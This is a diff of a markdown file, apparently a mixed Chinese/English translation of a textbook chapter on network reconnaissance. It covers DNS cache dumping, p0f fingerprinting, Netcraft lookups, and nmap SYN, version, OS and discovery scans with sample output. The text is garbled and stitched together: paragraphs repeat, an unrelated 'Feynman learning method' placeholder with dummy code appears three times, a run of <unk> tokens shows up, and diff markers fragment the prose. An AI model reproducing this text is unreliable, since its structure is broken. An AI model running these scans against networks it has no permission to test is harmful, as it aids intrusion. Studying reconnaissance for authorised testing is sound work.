+公司常用的 `split DNS` 实现将外部 DNS 与内部 DNS 分开。外部 DNS 通常只包含向外部世界提供 essential 服务的系统的完整限定域名（FQDN）。在外部 DNS 之上，往往还有一个内部 DNS，所有内部系统在此登记，以便使用 FQDN 而非 IP 地址进行访问。你的企业网络中的系统可能会向 DNS 服务器注册，这样其他人只需使用你的 FQDN 即可解析到你的 IP 地址。
 
--   [除了 SOA 记录提供的域级超时长度外，DNS 中每条单独记录都可以拥有自己的生存期（TTL）值。该值表明系统可以缓存结果的时间，然后需要再次向权威 DNS 服务器查询以确认值未变。根据 DNS 规范，不必等到条目生命周期结束才刷新缓存，而是使用小于完整 TTL 的值。TTL 仍然指导本地缓存中保留值的时长。]
+被动侦察能够收集大量信息。例如，监控网络头部（从层 3 到应用层）可以发现有趣的信息。虽然手动捕获数据包并逐一分析头部会很费时，但有一个程序能够自动完成大部分工作。该程序是 `p0f`，它会监听网络流量并随通信经过的接口进行观察。遗憾的是，`p0f` 的用途已经大幅下降。原因并非 `p0f` 本身，而是大多数 Web 服务器默认加密流量，导致 `p0f` 无法查看 HTTP 头部，也就无法识别服务器及其他有价值信息。下面展示了 `p0f` 的一些输出示例。
 
--   [Windows 系统会缓存这些值，并且可以导出缓存内容，如下面的片段所示。要在 Windows 系统上导出缓存，可使用命令行工具，例如传统的命令行或基于 PowerShell 的命令 `ipconfig /displaydns`。]
-
--   ```
-PS C:\Users\Ric Messier> ipconfig /displaydns
- 
-Windows IP Configuration
- 
-vortex.data.microsoft.com
-----------------------------------------
-Record Name . . . . . : vortex.data.microsoft.com
-Record Type . . . . . : 5
-Time To Live  . . . . : 24
-Data Length . . . . . : 8
-Section . . . . . . . : Answer
-CNAME Record  . . . . : asimov.vortex.data.trafficmanager.net
- 
- 
-Record Name . . . . . : asimov.vortex.data.trafficmanager.net
-Record Type . . . . . : 1
-Time To Live  . . . . : 24
-Data Length . . . . . : 4
-Section . . . . . . . : Answer
-A (Host) Record . . . : 64.4.54.254
- 
- 
-array511.prod.do.dsp.mp.microsoft.com
-----------------------------------------
-Record Name . . . . . : array511.prod.do.dsp.mp.microsoft.com
-Record Type . . . . . : 1
-Time To Live  . . . . : 1489
-Data Length . . . . . : 4
-Section . . . . . . . : Answer
-A (Host) Record . . . : 52.184.213.21
- 
-1.0.0.127.in-addr.arpa
-----------------------------------------
-Record Name . . . . . : 1.0.0.127.in-addr.arpa.
-Record Type . . . . . : 12
-Time To Live  . . . . : 541542
-Data Length . . . . . : 8
-Section . . . . . . . : Answer
-PTR Record  . . . . . : kubernetes.docker.internal
- 
- 
-download.visualstudio.microsoft.com
-----------------------------------------
-Record Name . . . . . : download.visualstudio.microsoft.com
-Record Type . . . . . : 5
-Time To Live  . . . . : 33
-Data Length . . . . . : 8
-Section . . . . . . . : Answer
-CNAME Record  . . . . : 2-01-5830-0005.cdx.cedexis.net
- 
- 
-Record Name . . . . . : 2-01-5830-0005.cdx.cedexis.net
-Record Type . . . . . : 5
-Time To Live  . . . . : 33
-Data Length . . . . . : 8
-Section . . . . . . . : Answer
-CNAME Record  . . . . : 4316b.wpc.azureedge.net
- 
- 
-Record Name . . . . . : 4316b.wpc.azureedge.net
-Record Type . . . . . : 5
-Time To Live  . . . . : 33
-Data Length . . . . . : 8
-Section . . . . . . . : Answer
-CNAME Record  . . . . : cs10.wpc.v0cdn.net
- 
- 
-Record Name . . . . . : cs10.wpc.v0cdn.net
-Record Type . . . . . : 28
-Time To Live  . . . . : 33
-Data Length . . . . . : 16
-Section . . . . . . . : Answer
-AAAA Record . . . . . : 2606:2800:11f:7de:d31:7db:168f:1225
- 
-array513.prod.do.dsp.mp.microsoft.com
-----------------------------------------
-Record Name . . . . . : array513.prod.do.dsp.mp.microsoft.com
-Record Type . . . . . : 1
-Time To Live  . . . . : 1202
-Data Length . . . . . : 4
-Section . . . . . . . : Answer
-A (Host) Record . . . : 52.184.214.53
-```]
-
--   [在实践中，外部侦察这种技术可能用处不大。一旦你获得内部网络的访问权限，你就想了解所有系统和 IP 地址。从外部，你可以查询公开来源获取组织可能拥有的地址块信息。而在内部，它们通常使用私有地址，公开记录中很少有关于这些地址块的信息，除非你偶然获得网络管理系统的访问权限，该系统记录所有地址块。相反，你可以在你拥有访问权限的系统上导出 DNS 缓存。导出的内容不仅包含主机名，还包含这些主机名对应的 IP 地址。如果缓存中出现大量公司域名的条目，你很可能正在查看内部 DNS 记录。另一种表明你拥有内部地址的线索是看到以 `.local` 结尾的条目，这是一个不能在 Internet 上使用的顶级域，常被用作内部 DNS 实现的顶级域（即完全限定域名的最后部分，包含主机名和域名）。]
-
--   [公司常用的 `split DNS` 实现将外部 DNS 与内部 DNS 分开。外部 DNS 通常只包含向外部世界提供 essential 服务的系统的完整限定域名（FQDN）。在外部 DNS 之上，往往还有一个内部 DNS，所有内部系统在此登记，以便使用 FQDN 而非 IP 地址进行访问。你的企业网络中的系统可能会向 DNS 服务器注册，这样其他人只需使用你的 FQDN 即可解析到你的 IP 地址。]
-
--   [被动侦察能够收集大量信息。例如，监控网络头部（从层 3 到应用层）可以发现有趣的信息。虽然手动捕获数据包并逐一分析头部会很费时，但有一个程序能够自动完成大部分工作。该程序是 `p0f`，它会监听网络流量并随通信经过的接口进行观察。遗憾的是，`p0f` 的用途已经大幅下降。原因并非 `p0f` 本身，而是大多数 Web 服务器默认加密流量，导致 `p0f` 无法查看 HTTP 头部，也就无法识别服务器及其他有价值信息。下面展示了 `p0f` 的一些输出示例。]
-
--   **
-
-
+```
 .-[ 192.168.86.45/46112 -> 8.43.72.22/443 (syn) ]-
+
  |
+
  | client   = `192.168.86.45/46112`
+
  | os       = `Linux 3.11 and newer`
+
  | dist     = `0`
+
  | params   = `none`
+
  | raw_sig  = `4:64+0:0:1460:mss*20,7:mss,sok,ts,nop,ws:df,id+:0`
+
  |
+
  `----
-  
+
  .-[ 192.168.86.45/46112 -> 8.43.72.22/443 (mtu) ]-
+
  |
+
  | client   = `192.168.86.45/46112`
+
  | link     = `Ethernet or modem`
+
  | raw_mtu  = `1500`
+
  |
+
  `----
-  
+
  .-[ 192.168.86.45/46112 -> 8.43.72.22/443 (uptime) ]-
+
  |
+
  | client   = `192.168.86.45/46112`
+
  | uptime   = `48 days 7 hrs 54 min (modulo 49 days)`
+
  | raw_freq = `1000.00 Hz`
+
  |
+
  `----
-  
+
  .-[ 192.168.86.45/33498 -> 52.94.210.45/443 (syn) ]-
+
  |
+
  | client   = `192.168.86.45/33498`
+
  | os       = `Linux 3.11 and newer`
+
  | dist     = `0`
+
  | params   = `none`
+
  | raw_sig  = `4:64+0:0:1460:mss*20,7:mss,sok,ts,nop,ws:df,id+:0`
+
  |
+
  `----
-  
+
  .-[ 192.168.86.45/33498 -> 52.94.210.45/443 (host change) ]-
+
  |
+
  | client   = `192.168.86.45/33498`
+
  | reason   = `tstamp port`
+
  | raw_hits = `0,1,1,1`
+
  |
+
  `----
 ```
+
+
+
 Very little of what you see here is anything you wouldn't be able to determine yourself if you knew how to read packet headers. The packet capture and analysis program Wireshark could provide much of this information. Some of the interesting bits, though, include identifying system uptime. This is the uptime on systems on my local network, so it's less interesting, perhaps, than it would be if we could so easily identify uptime on remote systems. You can also see that `p0f` is able to identify the operating system type on some systems. It happens to be the system that `p0f` is running on, but it makes the determination based on the network headers since operating systems have different “signatures” that are based on how the IP identification number is generated, how the TCP sequence number is generated, how ephemeral port numbers are selected, and other pieces of information `p0f` can collect.
 
 One tool you can use to quickly look up information from your web browser is Recon. This is a plugin for web browsers like Firefox and Chrome. When you activate it, a window that looks like what you see in Figure 4.14 opens. You can see the different flyout menus that allow you to do additional searching quickly. While this isn't strictly passive reconnaissance, it does give you quick access to tools like `whois` lookups, Google dorks, and other important searches. You can do this all without directly opening another tab or window.
@@ -3820,21 +4124,20 @@ Starting from the bottom of the stack, we can look at what the web server is as 
 **Gathering Website Intelligence**
 
 ```
- HTTP/1.1 403 Forbidden
- Date: Sun, 13 Nov 2022 21:13:14 GMT
- Content-Type: text/plain; charset=UTF-8
- Content-Length: 16
- Connection: keep-alive
- X-Frame-Options: SAMEORIGIN
- Referrer-Policy: same-origin
- Cache-Control: private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0
- Expires: Thu, 01 Jan 1970 00:00:01 GMT
- Set-Cookie: __cf_bm=bin1OduiDKdF6vN27ahHYxNqnw.NxagOfEHsoiMbMbM-1668373994-0-AWOI+udp/7xI5x/rmYxarZylVVD9gEnwVo7GJfbuURQ/2GlXn4aRrQmCl3wSBQk/NwWVvGaI77d3q8Hm9s2nhl4=; path=/; expires=Sun, 13-Nov-22 21:43:14 GMT; domain=.www.wiley.com; HttpOnly; Secure
- Strict-Transport-Security: max-age=2592000; includeSubDomains
- X-Content-Type-Options: nosniff
- Server: cloudflare
- CF-RAY: 769a8286dd543b9a-BOS 
- 
+HTTP/1.1 403 Forbidden
+Date: Sun, 13 Nov 2022 21:13:14 GMT
+Content-Type: text/plain; charset=UTF-8
+Content-Length: 16
+Connection: keep-alive
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: same-origin
+Cache-Control: private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Expires: Thu, 01 Jan 1970 00:00:01 GMT
+Set-Cookie: __cf_bm=bin1OduiDKdF6vN27ahHYxNqnw.NxagOfEHsoiMbMbM-1668373994-0-AWOI+udp/7xI5x/rmYxarZylVVD9gEnwVo7GJfbuURQ/2GlXn4aRrQmCl3wSBQk/NwWVvGaI77d3q8Hm9s2nhl4=; path=/; expires=Sun, 13-Nov-22 21:43:14 GMT; domain=.www.wiley.com; HttpOnly; Secure
+Strict-Transport-Security: max-age=2592000; includeSubDomains
+X-Content-Type-Options: nosniff
+Server: cloudflare
+CF-RAY: 769a8286dd543b9a-BOS
 ```
 
 There is actually an easier way to do this. The website `netcraft.com` will give hosting history for websites. This will provide the owner of the netblock that contains the IP address. It will also tell you the operating system the web server runs on. In some cases, you will get details about the web server version and other modules that have been enabled. One of the domains I have has been around for a long time, and Figure 4.15 shows the hosting history for that domain. In 2001, the site was hosted on an OpenBSD system (Netcraft says NetBSD/OpenBSD, but since I was hosting it myself, I know it was OpenBSD). You can also see that it was running on Apache at that time. This is an older hosting history from Netcraft. The current report only shows a single hosting provider in the history listing, but the output also shows a lot of other details, including whether the site is vulnerable to attacks like POODLE or Heartbleed.
@@ -3845,15 +4148,13 @@ There is actually an easier way to do this. The website `netcraft.com` will give
 
 While the history is interesting, it's far more relevant to know what the technology for the website is now. The top line is the most recent. Currently, the site is hosted on IIS with the network block being owned by Microsoft. That suggests that Microsoft is hosting this site, and since it's IIS, the operating system would be Windows Server. What we don't know is what version of Windows Server. The reason this information is useful is that we may be able to get a leg up on vulnerabilities. If we have some hints about versions, we would have a much better idea what vulnerabilities exist on the system where the website is hosted.
 
-
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
+1. 运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
+
 
 
 
@@ -3899,10 +4200,6 @@ Shodan 还需要你了解目标以及可以用来识别这些设备的内容。F
 
 DNS 包含大量关于公司的细节，如果你能够找到它。快速获取所有主机的方法是执行区域传输（zone transfer），但这通常不被允许。因此，你可能需要尝试类似 brute‑forcing DNS 请求的方法来猜测可能的 FQDN。通过此方法，你可以得到潜在的目标 FQDN，也会得到对应的 IP 地址。这些 IP 地址可以通过 `whois` 来查询所属网络段和拥有者。你可能会得到公司所属的 IP 地址段范围。
 
-[/content<unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk><unk>
-
-
-
 # 扫描网络
 
 扫描网络是侦察的基础步骤。它涉及发现网络中活动的主机、服务和开放端口。
@@ -3930,28 +4227,23 @@ nmap -sV -p 22,80,443 10.0.0.0/16
 
 扫描提供规划进一步利用步骤所需的基础数据，例如识别易受攻击的服务或映射网络拓扑结构。
 
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者 **Richard Feynman**。
 
-
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上 `20 min` 就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
 
+- 使用 MegaPing 是一种可以执行 ping 探测以及其他多种功能的工具。MegaPing 是一个基于 GUI 的工具，运行在 Windows 上，它将多种功能整合到一个界面中。ping 探测可以通过左侧列表中的 IP Scanner 工具实现。Figure 5.1 显示执行 IP 扫描后的完整界面。默认情况下，列表不包含 MAC 地址和主机名。右侧的复选框可以在执行扫描后勾选，信息会被加入。
 
-
--   使用 MegaPing 是一种可以执行 ping 探测以及其他多种功能的工具。MegaPing 是一个基于 GUI 的工具，运行在 Windows 上，它将多种功能整合到一个界面中。ping 探测可以通过左侧列表中的 IP Scanner 工具实现。Figure 5.1 显示执行 IP 扫描后的完整界面。默认情况下，列表不包含 MAC 地址和主机名。右侧的复选框可以在执行扫描后勾选，信息会被加入。
-
--   在左侧，你会看到其他多种工具，它们可以用于网络故障排查。除了排查网络问题外，还有一个端口扫描工具。下一节会更详细介绍端口扫描。在识别目标网络中的系统和服务时，你可能会发现其他枚举工具有用。
+- 在左侧，你会看到其他多种工具，它们可以用于网络故障排查。除了排查网络问题外，还有一个端口扫描工具。下一节会更详细介绍端口扫描。在识别目标网络中的系统和服务时，你可能会发现其他枚举工具有用。
 
 ![FIGURE 5.1 MegaPing IP Scanner](img/c05f001.png)
 
 **FIGURE 5.1** MegaPing IP Scanner
 
--   ping 探测虽然后续是第一步，但它仅提供有限的信息。它可以让你大致了解需要测试的主机数量，但仅凭主机是否存活（以及主机是否不存活的信息可能不可靠）并不能告诉你太多。最终，你想知道的是主机上运行的服务。ping 探测只能提供哪些系统可能是可目标的线索。根据你的测试方式和位置，这可能很有价值。你也可以直接进行端口扫描，因为端口扫描仪通常会先进行 ping 检测，确保目标系统已上线后再发送端口探测。
+- ping 探测虽然后续是第一步，但它仅提供有限的信息。它可以让你大致了解需要测试的主机数量，但仅凭主机是否存活（以及主机是否不存活的信息可能不可靠）并不能告诉你太多。最终，你想知道的是主机上运行的服务。ping 探测只能提供哪些系统可能是可目标的线索。根据你的测试方式和位置，这可能很有价值。你也可以直接进行端口扫描，因为端口扫描仪通常会先进行 ping 检测，确保目标系统已上线后再发送端口探测。
 
 ## 端口扫描
 
@@ -3965,29 +4257,25 @@ TCP 使用三次握手来建立连接。为了完成握手，TCP 使用 SYN 和 
 
 如前所述，端口扫描仪在进行端口扫描前可能会先发送 ICMP 回显请求。没有大量向不存在的主机发送数千条消息的意义。此行为可以根据所使用的端口扫描工具进行控制。
 
-*nmap*
+### nmap
 
- de facto（事实上）端口扫描器是 `nmap`，即网络映射器的缩写。它甚至被《黑客帝国 Reloaded》中的 Carrie‑Anne Moss 和《八角笼中》中的 Rihanna 认为足够好，所以我认为或你也应该认为它足够好。这是一款自 1997 年以来存在的程序，已成为如此广为人知的工具，以致其他端口扫描器会实现相同的命令行参数，因为这些参数非常熟悉。`nmap` 不仅是端口扫描器，它的主要功能以及其他功能都是核心目的的扩展。
+de facto（事实上）端口扫描器是 `nmap`，即网络映射器的缩写。它甚至被《黑客帝国 Reloaded》中的 Carrie‑Anne Moss 和《八角笼中》中的 Rihanna 认为足够好，所以我认为或你也应该认为它足够好。这是一款自 1997 年以来存在的程序，已成为如此广为人知的工具，以致其他端口扫描器会实现相同的命令行参数，因为这些参数非常熟悉。`nmap` 不仅是端口扫描器，它的主要功能以及其他功能都是核心目的的扩展。
 
 `nmap` 可以执行 UDP 扫描以及多种 TCP 扫描方式用于端口扫描。此外，`nmap` 还能够探测操作系统类型、应用程序以及应用程序版本。也许更重要的，`nmap` 支持运行脚本。这些脚本让任何人都可以扩展 `nmap` 的功能。由 Lua 编程语言驱动的脚本引擎拥有模块，脚本可以在此基础上构建，使得对系统的探测工作更加容易。
 
 ### TCP 扫描
+
 ```
-# 示例 TCP SYN 扫描命令
 nmap -sS -p 22,80,443 192.168.1.0/24
 ```
 
+- [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者 **Richard Feynman**。
 
-
--   [费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**Richard Feynman**。
-
-1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。
+1. 运用费曼技巧，你只需花上 `20 min` 就能深入理解知识点，而且记忆深刻，*难以遗忘*。
 
 ```
 if (condVar > someVal) {console.log("xxx")}
 ```
-
-
 
 Figure 5.2 将在 Wireshark（数据包捕获程序）中捕获到的这些请求捕获后展示给您。列表顶部的数据包是运行 `nmap` 的系统发出的探测请求。如果查看底部窗格中的数据包解码，您会看到该数据包中没有数据。UDP 头是预期的 8 字节，然后没有负载。列表底部显示的是目标主机的 ICMP “port unreachable” 消息。
 
@@ -4004,162 +4292,259 @@ Figure 5.2 将在 Wireshark（数据包捕获程序）中捕获到的这些请�
 **Nmap 版本扫描**
 
 ```
- $ nmap -sV 192.168.86.32
+$ nmap -sV 192.168.86.32
+
  Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-15 17:46 EST
+
  Nmap scan report for billthecat.lan (192.168.86.32)
+
  Host is up (0.0083s latency).
+
  Not shown: 995 closed ports
+
  PORT     STATE SERVICE       VERSION
+
  22/tcp   open  ssh           OpenSSH 7.4 (protocol 2.0)
+
  88/tcp   open  kerberos-sec  Heimdal Kerberos (server time: 2018-07-15 02:51:39Z)
+
  445/tcp  open  microsoft-ds?
+
  548/tcp  open  afp           Apple AFP (name: billthecat; protocol 3.4; OS X 10.9 - 10.11; Macmini7,1)
+
  5900/tcp open  vnc           Apple remote desktop vnc
+
  MAC Address: AC:87:A3:36:D6:AA (Apple)
+
  Service Info: OSs: OS X, Mac OS X; CPE: cpe:/o:apple:mac_os_x:10.9, cpe:/o:apple:mac_os_x
-  
+
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+
  Nmap done: 1 IP address (1 host up) scanned in 35.23 seconds
- 
 ```
 
+
+
 `nmap` 之所以知道服务详情，是因为应用程序在 `nmap` 连接时提供信息。不同的应用和协议会提供不同的信息集，这意味着 `nmap` 必须了解如何使用这些协议来获取信息。例如，像 Apache 这类 Web 服务器，系统管理员决定在响应客户端时应在头部提供多少信息。Apache 不仅可以提供产品名称（Apache），还可以提供软件版本、加载的模块以及模块的版本。
+
+## 操作系统扫描与 `nmap`
 
 您可能还想知道远程系统的操作系统是什么。`nmap` 也可以通过操作系统扫描来实现。为了确定操作系统，`nmap` 使用一个指纹库。指纹包含操作系统行为的细节，例如 IP 标识字段的生成方式、初始序列号、初始窗口大小以及其他多项细节。要识别操作系统，`nmap` 必须找到至少一个开放端口和一个关闭端口。
 
 下面的代码展示了操作系统扫描。即使我没有明确指定 TCP 扫描，`nmap` 仍然执行了它。之前已经识别出的开放端口再次被发现。您还会注意到 `nmap` 扫描了两个不同的系统。这也是 `nmap` 可以被指示扫描具体主机而非范围或网络块的方式。如果在命令行中提供多个系统，`nmap` 会对每个指定的系统执行相同的扫描。
 
-**操作系统扫描与 Nmap**
-
 ```
- $ sudo nmap -O 192.168.1.144 192.168.1.214
- Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-05 18:46 EST
- Nmap scan report for deathtongue (192.168.1.144)
- Host is up (0.042s latency).
- Not shown: 995 closed tcp ports (reset)
- PORT     STATE SERVICE
- 22/tcp   open  ssh
- 88/tcp   open  kerberos-sec
- 445/tcp  open  microsoft-ds
- 5000/tcp open  upnp
- 7000/tcp open  afs3-fileserver
- MAC Address: 14:98:77:31:B2:33 (Apple)
- No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
- TCP/IP fingerprint:
- OS:SCAN(V=7.93%E=4%D=2/5%OT=22%CT=1%CU=35270%PV=Y%DS=1%DC=D%G=Y%M=149877%TM
- OS:=63E04033%GCD=1%ISR=107%TI=Z%CI=RD%II=R
- OS:I%TS=21)OPS(O1=M5B4NW6NNT11SLL%O2=M5B4NW6NNT11SLL%O3=M5B4NW6NNT11%O4=M5B
- OS:4NW6NNT11SLL%O5=M5B4NW6NNT11SLL%O6=M5B4NNT11SLL)WIN(W1=FFFF%W2=FFFF%W3=F
- OS:FFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=40%W=FFFF%O=M5B4NW6SLL%CC=Y%Q
- OS:=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%
- OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
- OS:)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T=40%W=0%S=Z%A=
- OS:S%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK
- OS:=0%RUD=G)IE(R=Y%DFI=S%T=40%CD=S)
-  
- Network Distance: 1 hop
-  
- Nmap scan report for limekiller (192.168.1.214)
- Host is up (0.053s latency).
- Not shown: 997 filtered tcp ports (no-response)
- PORT    STATE SERVICE
- 135/tcp open  msrpc
- 139/tcp open  netbios-ssn
- 445/tcp open  microsoft-ds
- MAC Address: 54:14:F3:B8:A3:9E (Intel Corporate)
- Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
- Aggressive OS guesses: Microsoft Windows 10 (95%), Microsoft Windows Server 2008 SP1 (90%), Microsoft Windows 10 1703 (89%), Microsoft Windows 10 1511 - 1607 (88%), Microsoft Windows Phone 7.5 or 8.0 (88%), Microsoft Windows 10 1511 (87%), Microsoft Windows Server 2008 R2 or Windows 8.1 (87%), Microsoft Windows Server 2016 (87%), Microsoft Windows 7 Professional or Windows 8 (87%), Microsoft Windows 7 (87%)
- No exact OS matches for host (test conditions non-ideal).
- Network Distance: 1 hop
-  
- OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
- Nmap done: 2 IP addresses (2 hosts up) scanned in 116.89 seconds
- 
+$ sudo nmap -O 192.168.1.144 192.168.1.214
 
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-05 18:46 EST
 
+Nmap scan report for deathtongue (192.168.1.144)
 
+Host is up (0.042s latency).
+
+Not shown: 995 closed tcp ports (reset)
+
+PORT     STATE SERVICE
+
+22/tcp   open  ssh
+
+88/tcp   open  kerberos-sec
+
+445/tcp  open  microsoft-ds
+
+5000/tcp open  upnp
+
+7000/tcp open  afs3-fileserver
+
+MAC Address: 14:98:77:31:B2:33 (Apple)
+
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+
+TCP/IP fingerprint:
+
+OS:SCAN(V=7.93%E=4%D=2/5%OT=22%CT=1%CU=35270%PV=Y%DS=1%DC=D%G=Y%M=149877%TM
+
+OS:=63E04033%GCD=1%ISR=107%TI=Z%CI=RD%II=R
+
+OS:I%TS=21)OPS(O1=M5B4NW6NNT11SLL%O2=M5B4NW6NNT11SLL%O3=M5B4NW6NNT11%O4=M5B
+
+OS:4NW6NNT11SLL%O5=M5B4NW6NNT11SLL%O6=M5B4NNT11SLL)WIN(W1=FFFF%W2=FFFF%W3=F
+
+OS:FFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(R=Y%DF=Y%T=40%W=FFFF%O=M5B4NW6SLL%CC=Y%Q
+
+OS:=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%
+
+OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
+
+OS:)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T=40%W=0%S=Z%A=
+
+OS:S%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK
+
+OS:=0%RUD=G)IE(R=Y%DFI=S%T=40%CD=S)
+
+Network Distance: 1 hop
+
+Nmap scan report for limekiller (192.168.1.214)
+
+Host is up (0.053s latency).
+
+Not shown: 997 filtered tcp ports (no-response)
+
+PORT    STATE SERVICE
+
+135/tcp open  msrpc
+
+139/tcp open  netbios-ssn
+
+445/tcp open  microsoft-ds
+
+MAC Address: 54:14:F3:B8:A3:9E (Intel Corporate)
+
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+
+Aggressive OS guesses: Microsoft Windows 10 (95%), Microsoft Windows Server 2008 SP1 (90%), Microsoft Windows 10 1703 (89%), Microsoft Windows 10 1511 - 1607 (88%), Microsoft Windows Phone 7.5 or 8.0 (88%), Microsoft Windows 10 1511 (87%), Microsoft Windows Server 2008 R2 or Windows 8.1 (87%), Microsoft Windows Server 2016 (87%), Microsoft Windows 7 Professional or Windows 8 (87%), Microsoft Windows 7 (87%)
+
+No exact OS matches for host (test conditions non-ideal).
+
+Network Distance: 1 hop
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+
+Nmap done: 2 IP addresses (2 hosts up) scanned in 116.89 seconds
+```
 
 -   [nmap](https://nmap.org) 依赖于指纹，与人不同，同一指纹可以匹配多个操作系统。只要网络栈没有变化，你会发现多个商业操作系统的不同版本会匹配同一指纹。你可以在 Windows 系统的扫描中看到这一点。目标上运行的版本会落在 `nmap` 指示的范围内。还需要注意，`nmap` 会跟踪操作系统。操作系统实际上是内核——负责管理硬件、内存和进程的软件。其他帮助用户与操作系统交互的内容位于操作环境中，用于区分用途。在 Linux 中，同一个内核可能被多个发行版使用，但因为只识别内核，无法判断具体是哪个发行版。`nmap` 只能告诉你你运行的 Linux 内核版本，而不能区分 Ubuntu 与 CentOS 等。由于我们依赖指纹来识别操作系统，`nmap` 并不总能在操作系统更新时检测到版本。这在 Apple 系统中尤为明显。我们可以通过 MAC 地址判断是 Apple 系统。目标运行的是 Ventura 13.2，截至本次扫描，该版本尚未被加入 `nmap` 数据库。
 
-#### Scripting
+## Scripting
 
-我们已经看到 `nmap` 拥有大量功能，即便如此，仍可进一步扩展。`nmap` 包含一个脚本引擎，使用户可以以任何想要的方式扩展其功能。虽然这不完全是让你自行扩展功能，但脚本引擎已存在，并不完全由你决定如何使用它。随着最新版本的 `nmap`，已有数百个脚本可用，且数量在持续增长。它们被分为若干类别，当前包括 auth、broadcast、brute、default、discovery、dos、exploit、external、fuzzer、intrusive、malware、safe、version、vuln。你可以让 `nmap` 运行某一类别的所有脚本。下面的代码展示了让 `nmap` 运行 discovery 类别所有脚本的示例。
+我们已经看到 `nmap` 拥有大量功能，即便如此，仍可进一步扩展。`nmap` 包含一个脚本引擎，使用户可以以任何想要的方式扩展其功能。虽然这不完全是让你自行扩展功能，但脚本引擎已存在，并不完全由你决定如何使用它。随着最新版本的 `nmap`，已有数百个脚本可用，且数量在持续增长。它们被分为若干类别，当前包括 `auth`、`broadcast`、`brute`、`default`、`discovery`、`dos`、`exploit`、`external`、`fuzzer`、`intrusive`、`malware`、`safe`、`version`、`vuln`。你可以让 `nmap` 运行某一类别的所有脚本。下面的代码展示了让 `nmap` 运行 `discovery` 类别所有脚本的示例。
 
-**Nmap Discovery Scripts**
+### `nmap` Discovery Scripts
 
 ```
 $ sudo nmap -sS --script=discovery 192.168.86.0/24
+
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-15 17:48 EST
+
 Pre-scan script results:
+
 |_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
+
 | targets-asn: 
+
 |_  targets-asn.asn is a mandatory parameter
+
 |_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
+
 | ipv6-multicast-mld-list: 
+
 |   fe80::a483:e7ff:fe9c:6f65: 
+
 |     device: ens33
+
 |     mac: a6:83:e7:9c:6f:65
+
 |     multicast_ips: 
+
 |_      ff02::fb                  (mDNSv6)
+
 | targets-ipv6-multicast-mld: 
+
 |   IP: fe80::a483:e7ff:fe9c:6f65  MAC: a6:83:e7:9c:6f:65  IFACE: ens33
+
 | 
+
 |_  Use --script-args=newtargets to add the results as targets
+
 | broadcast-ping: 
+
 |   IP: 192.168.79.2  MAC: 00:50:56:f6:4b:60
+
 |   IP: 192.168.79.1  MAC: a6:83:e7:9c:6f:65
+
 |_  Use --script-args=newtargets to add the results as targets
+
 | targets-ipv6-multicast-echo: 
+
